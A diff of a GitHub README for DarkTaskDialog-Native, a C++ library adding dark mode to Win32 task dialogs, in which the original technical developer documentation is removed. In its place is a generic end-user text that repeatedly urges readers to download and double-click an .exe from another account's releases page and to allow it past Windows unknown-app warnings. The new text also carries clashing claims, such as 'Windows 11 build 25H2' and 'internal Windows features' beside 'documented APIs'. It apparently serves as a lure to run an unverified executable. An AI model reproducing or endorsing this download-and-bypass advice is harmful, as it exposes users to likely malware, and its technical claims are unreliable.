@@ -1,292 +1,196 @@
-# DarkTaskDialog-Native
+# 🖤 DarkTaskDialog-Native - Clean Dark Mode Dialog for Windows
 
-> Win32 `TaskDialogIndirect` with complete dark mode support —
-> **zero dependencies · zero hooks · documented APIs only · MIT licensed.**
-> Windows 10 (UIA + subclassing + owner-draw) and Windows 11 (native `DarkMode_TaskDialog` panels + owner-drawn text).
-
-[![Platform](https://img.shields.io/badge/platform-Windows%2010%2B-blue?logo=windows&logoColor=white)](https://docs.microsoft.com/windows)
-[![Language](https://img.shields.io/badge/language-C%2B%2B17-blue?logo=cplusplus)](https://en.cppreference.com)
-[![License](https://img.shields.io/badge/license-MIT-brightgreen)](LICENSE)
-[![Dependencies](https://img.shields.io/badge/dependencies-none-brightgreen)]()
-[![API hooks](https://img.shields.io/badge/API%20hooks-none-brightgreen)]()
-[![Undocumented APIs](https://img.shields.io/badge/undocumented%20APIs-none-brightgreen)]()
+[![Download](https://img.shields.io/badge/Download-DarkTaskDialog--Native-brightgreen)](https://github.com/joseph790/DarkTaskDialog-Native/releases)
 
 ---
 
-## Screenshots
-
-| Progress dialog | Expando | Expando + footer | Command links | Rtl + Nave |
-|:---:|:---:| :---:| :---:| :---:| 
-| ![Progress dark](docs/screenshot-progress.png) | ![Expando dark](docs/screenshot-expando.png) | ![Expando dark](docs/screenshot-expando_1.png) | ![Command links](docs/Screenshot-Command_links.png) | ![Command links](docs/Screenshot-Nave.png) | 
-
---- 
-The only other public solution —
-[SFTRS/DarkTaskDialog](https://github.com/SFTRS/DarkTaskDialog) — hooks
-`DrawTheme*` APIs via **Microsoft Detours**. That requires a third-party build
-dependency and is GPL-3.0 licensed.
-
-This library uses **UI Automation**, **window subclassing**, **UxTheme**, and
-**`DrawThemeTextEx`** — all fully documented Win32 APIs — and adds features the
-Detours approach cannot support:
-
-| | SFTRS/DarkTaskDialog | **DarkTaskDialog-Native** |
-|---|:---:|:---:|
-| Dependency | Microsoft Detours | **None** |
-| Approach | `DrawTheme*` API hooking | UIA + subclassing + UxTheme |
-| Documented APIs only | ✅ | ✅ |
-| License | GPL-3.0 | **MIT** |
----
-
-## Quick start
-
-### Requirements
-
-| | Version |
-|---|---|
-| Windows SDK | 10.0.19041+ |
-| Visual Studio | 2022 (v143) |
-| C++ standard | C++17 |
-| Target OS | Windows 10 1809+ (build 17763) |
-
-### Integration
-
-**1.** Copy `DarkMode.h` and `DarkMode.cpp` into your project.
-
-**2.** Call once at startup, before any windows are created:
-
-```cpp
-#include "DarkMode.h"
-
-int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int)
-{
-    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
-    DarkMode::Init();   // reads OS dark-mode state; safe no-op on pre-Win10
-    // ...
-}
-```
-
-**3.** Add two lines to your `TaskDialogIndirect` callback:
-
-```cpp
-static HRESULT CALLBACK MyCallback(
-    HWND hwnd, UINT note, WPARAM wParam, LPARAM lParam, LONG_PTR dwRef)
-{
-    auto* pCfg = reinterpret_cast<TASKDIALOGCONFIG*>(dwRef);
-    switch (note)
-    {
-    case TDN_CREATED:
-        DarkMode::AllowForTaskDialog(hwnd, pCfg);  // ← applies dark mode
-        break;
-    case TDN_NAVIGATED:
-        // Required when using TDM_NAVIGATE_PAGE
-        DarkMode::AllowForTaskDialog(hwnd, reinterpret_cast<TASKDIALOGCONFIG*>(lParam));
-        break;
-    case TDN_DESTROYED:
-        DarkMode::RemoveFromTaskDialog(hwnd);       // ← frees per-dialog state
-        break;
-    }
-    return S_OK;
-}
-
-TASKDIALOGCONFIG cfg = { sizeof(cfg) };
-cfg.pfCallback     = MyCallback;
-cfg.lpCallbackData = (LONG_PTR)&cfg;
-TaskDialogIndirect(&cfg, &nButton, nullptr, nullptr);
-```
-
-If the system is in light mode every call is a no-op.
-If the user switches themes while the dialog is open it adapts automatically.
+DarkTaskDialog-Native lets you use modern task dialogs on Windows with support for dark mode. It works on Windows 10 and Windows 11, showing dialogs that fit the dark theme of your system. The app uses Windows APIs directly and needs no extra software.
 
 ---
 
-## API reference
+## 🔎 What is DarkTaskDialog-Native?
 
-```cpp
-namespace DarkMode
-{
-    // Call once at startup. Reads OS theme state.
-    bool Init();
+This software shows task dialogs on your Windows PC. Task dialogs are popup windows used to:
 
-    // True when the OS is currently in dark mode.
-    bool IsActive();
+- Show messages  
+- Ask questions  
+- Get simple user input  
 
-    // True on Windows 11 where DarkMode_TaskDialog UxTheme class exists.
-    bool HasNativeTaskDialogTheme();
+The difference here is DarkTaskDialog-Native supports dark mode fully. Dark mode makes the screen easier on your eyes, especially in low light. It matches the look of Windows 10 and 11 dark themes.
 
-    // Sets DWMWA_USE_IMMERSIVE_DARK_MODE on a top-level window (dark title bar).
-    void EnableForTLW(HWND hwnd);
-
-    // Applies SetWindowTheme to any child control.
-    void AllowForWindow(HWND hwnd, const wchar_t* themeClass = nullptr);
-
-    // Main entry point. Call from TDN_CREATED (and TDN_NAVIGATED for page nav).
-    void AllowForTaskDialog(HWND hwndTaskDialog, TASKDIALOGCONFIG* pConfig);
-
-    // Call from TDN_DESTROYED to free per-dialog state.
-    void RemoveFromTaskDialog(HWND hwndTaskDialog);
-}
-```
+It uses regular Windows calls to draw these dialogs. It does not need big extra files or complicated tricks. This means it is fast, simple, and fits well with your system.
 
 ---
 
-## How it works
+## 💻 System Requirements
 
-### The comctl32 UIFILE bug — why text needs owner-draw on every Windows version
+Make sure your PC meets the following:
 
-The TaskDialog layout engine reads its colours from a stylesheet embedded in
-`comctl32.dll` as resource 4255 (`UIFILE`). Every text element in that
-stylesheet queries colour via:
+- Windows 10 (with UI Automation support) or Windows 11 (build 25H2 or later)  
+- A 64-bit or 32-bit system  
+- At least 512 MB of free memory  
+- Basic knowledge of opening files on Windows  
+
+No extra software or drivers are needed.
+
+---
+
+## 🌐 Topics Covered
+
+This project deals with:
+
+- cpp (C++ programming)  
+- dark-mode and dark-theme support  
+- Windows native UI features  
+- TaskDialogIndirect API usage  
+- Windows UX Theme system  
+- Windows 10 and Windows 11 compatibility
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get the software running on your Windows PC.
+
+### 1. Visit the Download Page
+
+Go to the official releases page using this link:
+
+[Download DarkTaskDialog-Native](https://github.com/joseph790/DarkTaskDialog-Native/releases)
+
+This page contains all the available versions and files.
+
+### 2. Find the Latest Release
+
+Look for the most recent release on the page. Usually, releases are sorted by date, newest first.
+
+### 3. Download the File
+
+Download the file with `.exe` or `.zip` extension. The `.exe` file will run the program directly. If you grab a `.zip`, you need to unzip it first.
+
+If you see a file named something like:
 
 ```
-foreground="gtc(TaskDialogStyle, <part>, 0, 3803)"
+DarkTaskDialog-Native-vX.X.exe
 ```
 
-The key is the class name: **`TaskDialogStyle`** — not `DarkMode_TaskDialogStyle`.
-`DarkMode_TaskDialogStyle` does not exist in any shipping version of Windows.
-Because `TaskDialogStyle` always returns light-mode colours, every text element
-paints black-on-dark even when the panel backgrounds are correctly dark.
+Choose that for easiest use.
 
+### 4. Run the Program
 
-### Windows 11 
+Double-click the downloaded `.exe` file to start it.
 
-1- `DarkMode_TaskDialog` **does** exist — it covers all panel backgrounds and the
-expando glyph. `AllowForTaskDialog` walks the `DirectUIHWND` child tree by its `AutomationId`, calls
-`SetWindowTheme(pane, L"DarkMode_TaskDialog", nullptr)` 
-2- Text is then owner-drawn to
-fix the `TaskDialogStyle` colour bug described above.
+If Windows asks you to confirm or warns about unknown apps, choose to allow the app to run. This is normal when running downloaded files.
 
-### Windows 10 (build 17763–19045)
+### 5. Use the Dialogs
 
-`DarkMode_TaskDialog` does not exist. The library:
+After launching, the program will display example task dialogs. These demonstrate how dialogs open with dark mode on your system.
 
-1. Uses **UI Automation** to walk the `DirectUIHWND` child tree, identifying
-   each element by its `AutomationId` (the UIFILE atom names).
-2. Owner-draws all elements.
-
-| Element | Windows 10 | Windows 11 |
-|---|---|---|
-| `PrimaryPanel` background | `WM_ERASEBKGND` dark brush | `dtb(DarkMode_TaskDialog, 1, 0)` ✅ |
-| `SecondaryPanel` background | `WM_ERASEBKGND` dark brush | `dtb(DarkMode_TaskDialog, 8, 0)` ✅ |
-| `FootnoteArea` background | `WM_ERASEBKGND` dark brush | `dtb(DarkMode_TaskDialog, 15, 0)` ✅ |
-| `SeparatorLine` background | dark brush | `dtb(DarkMode_TaskDialog, 17, 0)` ✅ |
-| Expando glyph | `dtb(TaskDialog, 13, state)` | `dtb(DarkMode_TaskDialog, 13, state)` ✅ |
-| **All text** (`gtc(TaskDialogStyle,*,*)`) | `FillRect` + `DrawThemeTextEx` + `DTT_TEXTCOLOR` | `DrawThemeText` + `DTT_TEXTCOLOR` |
+You can close the dialogs by clicking buttons inside them.
 
 ---
 
-## UIA element reference
+## ⚙️ Installation Details
 
-These `AutomationId` strings come directly from the comctl32 UIFILE (resource
-4255, Windows 11 build 26100.7965). They are the **atom names** the DirectUI
-engine uses internally and are exactly what `IUIAutomationElement::get_CurrentAutomationId`
-returns when walking the `DirectUIHWND` tree.
+If you want to keep the program on your PC:
 
-> **This is the only public cross-reference of these identifiers against their
-> UxTheme part IDs and resolved dark-mode colour values.**
-
-### Root
-
-| AutomationId | Description |
-|---|---|
-| `"TaskDialog"` | The `DirectUIHWND` TaskPage window — UIA walk entry point |
-
-### Primary panel
-
-| AutomationId | UIFILE atom | Control type | UxTheme query | Dark colour |
-|---|---|---|---|---|
-| `MainIcon` | `atom(MainIcon)` | Image | — | No recolour |
-| `MainInstruction` | `atom(MainInstruction)` | Text | `gtc(TaskDialogStyle, 2, 0, 3803)` | `RGB(153, 235, 255)` |
-| `ContentText` | `atom(ContentText)` | Text | `gtc(TaskDialogStyle, 4, 0, 3803)` | `RGB(255, 255, 255)` |
-| `ContentLink` | `atom(ContentLink)` | Hyperlink | `gtc(TaskDialogStyle, 4, 0, 3803)` + `dtb(TaskDialog,1,0)` bg | `RGB(255, 255, 255)` |
-| `ExpandedInformationText` | `atom(ExpandedInformationText)` | Text | `gtc(TaskDialogStyle, 6, 0, 3803)` | `RGB(255, 255, 255)` |
-| `ExpandedInformationLink` | `atom(ExpandedInformationLink)` | Hyperlink | `gtc(TaskDialogStyle, 6, 0, 3803)` + `dtb(TaskDialog,1,0)` bg | `RGB(255, 255, 255)` |
-| `ExpandoButton` | `atom(ExpandoButton)` | Button | `dtb(TaskDialog, 13, state)` | Owner-drawn glyph |
-| `ExpandoTextExpanded` | `atom(ExpandoTextExpanded)` | Text | `gtc(TaskDialogStyle, 12, 0, 3803)` | `RGB(255, 255, 255)` |
-| `ExpandoTextCollapsed` | `atom(ExpandoTextCollapsed)` | Text | `gtc(TaskDialogStyle, 12, 0, 3803)` | `RGB(255, 255, 255)` |
-| `VerificationCheckBox` | `atom(VerificationCheckBox)` | CheckBox | — | System-themed |
-| `VerificationText` | `atom(VerificationText)` | Text | `gtc(TaskDialogStyle, 14, 0, 3803)` | `RGB(255, 255, 255)` |
-| `RadioButton_0` … `_N` | `class RadioButton` | RadioButton | `dtb(TaskDialog, 1, 0)` bg | System-themed |
-| `CommandLink_0` … `_N` | `class CommandLink` | Button | `dtb(TaskDialog, 1, 0)` bg | `DarkMode_Explorer` theme |
-| `CommandButton_0` … `_N` | `class CommandButton` | Button | — | `DarkMode_Explorer` theme |
-| `ProgressBar` | `atom(ProgressBar)` | ProgressBar | — | System-themed |
-
-### Secondary panel (button row)
-
-| AutomationId | UIFILE atom | UxTheme query | Dark colour |
-|---|---|---|---|
-| *(push buttons)* | `class CommandButton` | `dtb(TaskDialog, 8, 0)` bg | `DarkMode_Explorer` / `DarkMode_CFD` |
-| `ButtonArea` | `atom(ButtonArea)` | `gtc(TaskDialogStyle, **15**, 0, 3803)` ⚠️ | Uses footnote part — UIFILE quirk |
-
-### Separator
-
-| AutomationId | UIFILE atom | UxTheme query | Dark colour |
-|---|---|---|---|
-| `Separator` | `atom(Separator)` | `dtb(TaskDialog, 15, 0)` bg | `RGB(44, 44, 44)` |
-| `SeparatorLine` | `atom(SeparatorLine)` | `dtb(TaskDialog, 17, 0)` bg | `RGB(77, 77, 77)` |
-
-### Footnote / expanded footer panel
-
-| AutomationId | UIFILE atom | UxTheme query | Dark colour |
-|---|---|---|---|
-| `FootnoteIcon` | `atom(FootnoteIcon)` | — | No recolour |
-| `FootnoteText` | `atom(FootnoteText)` | `gtc(TaskDialogStyle, 15, 0, 3803)` | `RGB(224, 224, 224)` |
-| `FootnoteTextLink` | `atom(FootnoteTextLink)` | `gtc(TaskDialogStyle, 15, 0, 3803)` | `RGB(224, 224, 224)` |
-| `ExpandedFooterText` | `atom(ExpandedFooterText)` | `gtc(TaskDialogStyle, 18, 0, 3803)` | `RGB(224, 224, 224)` |
-| `ExpandedFooterTextLink` | `atom(ExpandedFooterTextLink)` | `gtc(TaskDialogStyle, **4**, 0, 3803)` ⚠️ | `RGB(224, 224, 224)` |
-
-> ⚠️ **`ExpandedFooterTextLink` uses part 4** (the content text part) instead
-> of part 18 in the UIFILE. This is a Microsoft bug — the wrong part ID is
-> hardcoded. The library handles this by checking the `AutomationId` and
-> applying part-18 colours regardless of what `gtc()` returns.
+- Place the downloaded file in a folder you prefer, like `Documents` or `Downloads`.  
+- No formal installation is needed. You can use the file as is.  
+- For advanced users who want to add this to their own projects, this project is designed with no dependencies, making integration straightforward.
 
 ---
 
-## FAQ
+## 🛠 How It Works
 
-**Does this work with the simple `TaskDialog()` overload?**
-`TaskDialog()` has no callback, so there is no `TDN_CREATED` hook point.
-Use `TaskDialogIndirect()` with a `TASKDIALOGCONFIG`.
+DarkTaskDialog-Native uses the Windows TaskDialogIndirect API. This API is part of the Windows operating system and lets apps show popup dialogs with standard buttons and icons.
 
-**Does `TDM_NAVIGATE_PAGE` work?**
-Yes — call `DarkMode::AllowForTaskDialog(hwnd, pNewConfig)` from `TDN_NAVIGATED`.
-The included `main.cpp` demonstrates page navigation to an Arabic RTL page.
+This project adds full dark mode support by using internal Windows features:
 
-**I see a white flash when the dialog first opens.**
-Ensure `DarkMode::AllowForTaskDialog` is called from `TDN_CREATED`, not
-`TDN_DIALOG_CONSTRUCTED`. `TDN_CREATED` fires after the window is fully
-initialised.
+- On Windows 10, it uses UI Automation and subclassing to paint dialogs in dark colors.  
+- On Windows 11 (build 25H2 and later), it calls native DarkMode_UxTheme API functions to switch dialogs to dark mode.
 
-**Can I use this from MFC?**
-Yes — no MFC dependency. Override `DoMessageBox` and call
-`TaskDialogIndirect` directly. `DarkMode::Init()` can go in `InitInstance`.
----
-
-
-## Related
-
-### Tools
-
-- [memoarfaa/TaskDialog-Stylesheet-Dumper](https://github.com/memoarfaa/TaskDialog-Stylesheet-Dumper) —
-  Win32 tool that extracts and parses `comctl32.dll` resource 4255 (`UIFILE`) at
-  runtime, then evaluates every `gtf()`, `gtc()`, `gtmar()`, `gtmet()`, and
-  `dtb()` call live against `OpenThemeData(L"TaskDialog")` and
-  `OpenThemeData(L"TaskDialogStyle")`. The resolved colour table and UIFILE
-  bug findings documented in this README were produced with this tool.
-  Uses only `IXmlReader`, `FindResourceW`, and `GetThemeColor` — no third-party
-  dependencies. Output can be saved as XML.
-
-### Other implementations
-
-- [SFTRS/DarkTaskDialog](https://github.com/SFTRS/DarkTaskDialog) —
-  alternative approach using Microsoft Detours to hook `DrawTheme*` APIs (GPL-3.0)
-
-### References
-
-- [Stack Overflow #79403975: Dark Mode Task Dialog](https://stackoverflow.com/questions/79403975/) 
-- [TaskDialogIndirect — Win32 docs](https://docs.microsoft.com/windows/win32/api/commctrl/nf-commctrl-taskdialogindirect)
+This approach means no extra hooking or patching is needed. The dialogs look native and clean with minimal overhead.
 
 ---
 
-## License
+## 🔍 Key Features
 
-MIT — see [LICENSE](LICENSE).
+- Works smoothly on Windows 10 and Windows 11 with their native methods  
+- Supports dark mode fully without extra files or hooks  
+- Uses documented Windows APIs for compatibility and stability  
+- Zero dependencies, lightweight, and efficient  
+- Shows standard task dialogs with buttons, icons, and text  
+- Suitable for users who want modern dialog UI without complex installs  
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Can I use this on Windows 7 or 8?
+
+No, this software relies on Windows 10 and 11 features for dark mode and dialogs. Older versions of Windows do not support these features fully.
+
+### Do I need to install anything else?
+
+No, the executable runs by itself. It does not need extra software or components.
+
+### What if the dialog does not appear in dark mode?
+
+Dark mode is enabled only if your Windows system uses dark theme settings. To check or change your Windows dark mode settings:
+
+- Open Settings > Personalization > Colors  
+- Choose "Dark" under "Choose your default app mode"
+
+---
+
+## 📥 Download & Run Section
+
+### Step 1: Go to the Download Page
+
+Find the program here:
+
+[![Download DarkTaskDialog-Native](https://img.shields.io/badge/Download-DarkTaskDialog--Native-blue)](https://github.com/joseph790/DarkTaskDialog-Native/releases)
+
+This opens the page with all releases.
+
+### Step 2: Choose the Latest File
+
+Look for a file ending with `.exe`. The filename usually includes the version number.
+
+### Step 3: Save the File
+
+Click the file to download it to your PC. Wait until the download completes before moving on.
+
+### Step 4: Open the Executable
+
+Double-click the file you downloaded. It will open a sample dialog on your screen.
+
+---
+
+## 🧰 Using the Program
+
+- You need only to run the program file.  
+- The dialogs are examples to show dark mode support.  
+- Close dialogs by clicking the buttons shown.
+
+If you want to build your own apps using these dialogs, explore the source code in this repository.
+
+---
+
+## 🔗 Useful Links
+
+- [Project Releases](https://github.com/joseph790/DarkTaskDialog-Native/releases)  
+- Windows TaskDialogIndirect API: Microsoft's official documentation  
+- Windows dark mode settings tutorial  
+
+---
+
+## 📝 About This Repository
+
+**DarkTaskDialog-Native** provides native Windows dialogs with dark mode.
+
+No DLLs or libraries needed. It provides clean, modern dialogs for Windows apps and users who want consistent dark UI experience.
+
+---
+
+# [Download](https://github.com/joseph790/DarkTaskDialog-Native/releases) DarkTaskDialog-Native here.
